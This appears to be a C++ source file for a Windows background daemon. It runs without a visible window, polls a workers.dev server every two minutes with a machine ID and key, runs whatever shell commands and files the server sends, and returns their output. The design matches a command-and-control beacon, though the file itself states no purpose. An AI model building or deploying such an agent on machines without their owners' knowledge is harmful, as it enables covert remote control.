#include <string>
#include <algorithm>
#include <stdexcept>
#include <cstdlib>
#include <curl/curl.h>
#include <rapidjson/document.h>
#include <windows.h>
#include "daemon.h"

//#include <iostream>

std::string BASE_DIR;
std::string MACHINE_ID;
std::string DAEMON_KEY;
//const char *CERT_PATH;

CURL *curl;
CURLcode curlRes;
std::string readBuffer;
struct curl_slist *headers;

void CALLBACK CronJob(HWND, UINT, UINT_PTR, DWORD){
    try {
        if(curl) {
            readBuffer = "";
            curlRes = curl_easy_perform(curl);
            
            long status_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status_code);

            if (curlRes != CURLE_OK) {
                logError("Temporary USER_CRV failure " + std::to_string(curlRes));
                return;
            }
            if (status_code == 401){
                logError("Auth_ABF_CRV failure");
                curl_slist_free_all(headers);
                curl_easy_cleanup(curl);
                exit(0); //Shut down unauthorized daemon
            } else if (status_code != 200){
                logError("NOK failure");
                return;
            }
            //std::cout << readBuffer << std::endl;
            
            rapidjson::StringStream json_stream(readBuffer.c_str());
            rapidjson::Document result;
            result.ParseStream(json_stream);
            rapidjson::Value& jobs = result["body"];

            for (rapidjson::SizeType i = 0; i < jobs.Size(); i++){
                Result res;
                
                if (!jobs[i]["file"].IsNull()){
                    if (saveFile(jobs[i]["file"].GetString(), BASE_DIR+"\\cache\\FILE") == 1){
                        res.exitcode = 501;
                        res.output = "<FILE_ERROR>Failed to create file<FILE_ERROR>";
                        SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res, DAEMON_KEY);
                        continue;
                    }
                }
                std::string command = jobs[i]["command"].GetString();
                try{
                    res = exec(command, BASE_DIR);
                } catch(const std::exception &e){
                    res.exitcode=500;
                    res.output += "<INTERNAL_ERROR> "+escapeChars(e.what())+" <INTERNAL_ERROR>";
                }
                SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res, DAEMON_KEY);
            }
        }
    } catch(const std::exception &e) {
        logError("INTERNAL_ERROR: "+std::string(e.what()));
    }
}
void curl_fetch_init(){
    curl = curl_easy_init();
    if (curl){
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
        curl_easy_setopt(curl, CURLOPT_URL, "https://<REDACTED>.workers.dev/api/fetch");
        
        //curl_easy_setopt(curl, CURLOPT_CAINFO, CERT_PATH);

        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
        headers = NULL;
        headers = curl_slist_append(headers, ("Authorization:"+DAEMON_KEY).c_str());
        headers = curl_slist_append(headers, ("MID:"+MACHINE_ID).c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
    } else {
        logError("cannot initialize");
        exit(0);
    }
}
//
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    //curl_version_info_data* data = curl_version_info(CURLVERSION_NOW);
    //std::string sslVer = data->ssl_version;
    //system(("msg * \"SSL Version: "+ sslVer +"\"").c_str());
    BASE_DIR = getBaseDirectory();
    DAEMON_KEY = getDaemonKey(BASE_DIR);
    MACHINE_ID = getMachineID(BASE_DIR);
    
    //std::string BASE_DIR_COPY = BASE_DIR;
    //std::replace(BASE_DIR_COPY.begin(), BASE_DIR_COPY.end(), '\\', '/');
    //BASE_DIR_COPY = BASE_DIR_COPY + "\\cert.dat";
    //CERT_PATH = BASE_DIR_COPY.c_str();
    
    curl_fetch_init();

    HWND hwnd = CreateWindowEx(0, "STATIC", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);

    UINT_PTR timerId = SetTimer(hwnd, 1, 120000, CronJob); //(60000 = 1min) (120000 = 2min)
    if (!timerId) {
        logError("CRON failure {32EBB82E-6B89-4DDF-9C5F-D9D46882332D}");
        curl_slist_free_all(headers);
        return 0;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    KillTimer(hwnd, timerId);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    /*
    while (true) {
        CronJob();  // Call the function
        std::this_thread::sleep_for(std::chrono::seconds(30)); // Sleep for 1 minute
    }
    */
    return 0;
}